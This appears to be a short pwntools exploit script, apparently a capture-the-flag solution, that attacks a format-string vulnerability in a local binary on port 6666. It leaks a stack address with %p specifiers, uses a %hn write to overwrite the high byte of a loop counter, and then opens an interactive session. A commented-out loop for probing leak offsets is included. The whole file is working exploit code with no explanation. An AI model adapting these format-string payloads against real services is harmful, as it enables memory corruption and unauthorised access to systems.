from pwn import *
context.terminal = ["alacritty","-e"]
# context.log_level = "debug"
# p = process("./main")
# p = gdb.debug("./main")
p = remote("localhost",6666)

# leak
# for i in range(1,30):
# 	p.recvuntil(b"chn3ml? ")
# 	p.send(f"aaaaaaaa%{i}$p\n".encode().ljust(32))
# 	print("i:",i,p.recvline())
# 	p.recvuntil(b"chn3ml? ")
# 	p.send(f"aaaaaaaa%{i}$p\n".encode().ljust(32))
# 	print("i:",i,p.recvline())


str_offset = 6
i_offset = 10
i_addr_offset = 11

p.recvuntil(b"chn3ml? ")
p.send(f"|%{i_addr_offset}$p|".encode().ljust(31))
p.recvuntil(b"|")
i_addr = p.recvuntil(b"|")[:-1]
log.info(f"{i_addr=}")
i_addr = p64(int(i_addr,16)+3) # msb

payload = b""
payload += f"aaaa%{str_offset+3}$hn2".encode().ljust(24,b" ")
payload += i_addr

log.info(f"payload len : {len(payload)}")
p.recvuntil(b"chn3ml? ")
p.send(payload)

p.interactive()
